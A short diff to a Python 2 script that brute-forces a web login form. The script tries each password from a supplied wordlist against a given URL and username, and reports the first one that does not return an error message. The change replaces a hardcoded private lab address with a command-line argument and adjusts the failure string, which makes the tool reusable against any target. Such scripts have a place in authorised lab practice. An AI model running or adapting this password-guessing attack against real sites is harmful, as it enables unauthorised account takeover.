@@ -7,7 +7,7 @@ if len(sys.argv) < 4:
     print "usage: <url> <username> <path a passlist> "
     sys.exit()
 
-url = 'http://10.10.10.15/index.php'
+url = sys.argv[1]
 username = sys.argv[2]
 pathpass = sys.argv[3]
 passlist = open(pathpass, 'r').readlines()
@@ -19,11 +19,11 @@ for line in passlist:
     content = http.content
 
     #Invalid or error message request to compare    
-    if "password is incorrect" in content:
+    if "Invalid" in content:
         print "no no no : ", password
        
     else:
-        print "password encontrado = ", password, "size : ", size
+        print "password encontrado = ", password
         sys.exit()
     
        
